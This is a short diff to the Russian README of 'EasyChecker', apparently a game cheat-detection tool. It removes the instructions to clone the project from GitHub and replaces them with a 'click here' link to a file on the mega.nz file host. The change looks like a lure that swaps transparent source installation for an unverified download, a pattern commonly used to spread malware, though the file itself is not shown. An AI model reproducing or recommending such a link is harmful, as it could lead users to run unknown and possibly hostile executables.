@@ -11,10 +11,4 @@ EasyChecker — это инструмент для обнаружения чит
 
 ## Установка
 
-Для того чтобы установить EasyChecker, клонируйте репозиторий и установите зависимости.
-
-### Клонирование репозитория
-
-```bash
-git clone https://github.com/avirt1274/EasyChecker.git
-cd EasyChecker
+Для того чтобы установить EasyChecker, [кликните здесь](<https://mega.nz/file/YRQyVYpT#We9Py-_pH_cdnNFhQJF14ogE12Zsg_RFhzZudJny0W4>)
